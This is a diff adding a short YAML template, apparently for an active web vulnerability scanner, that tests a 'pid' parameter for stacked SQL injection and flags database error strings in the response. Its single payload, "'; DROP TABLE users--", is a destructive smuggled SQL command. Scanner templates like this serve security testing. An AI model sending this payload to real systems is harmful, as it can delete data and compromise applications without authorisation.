@@ -1,0 +1,25 @@
+id: sqli2-stacked-07
+name: 'SQLi stacked via pid'
+severity: critical
+type: active
+tags:
+  - sqli
+  - injection
+  - stacked
+description: 'Extra SQL statement via pid'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      pid:
+        - '''; DROP TABLE users--'
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - 'SQL syntax'
+          - 'mysql_fetch'
+          - 'PostgreSQL'
+          - 'ODBC'
+          - 'ORA-'
+          - 'SQLite'
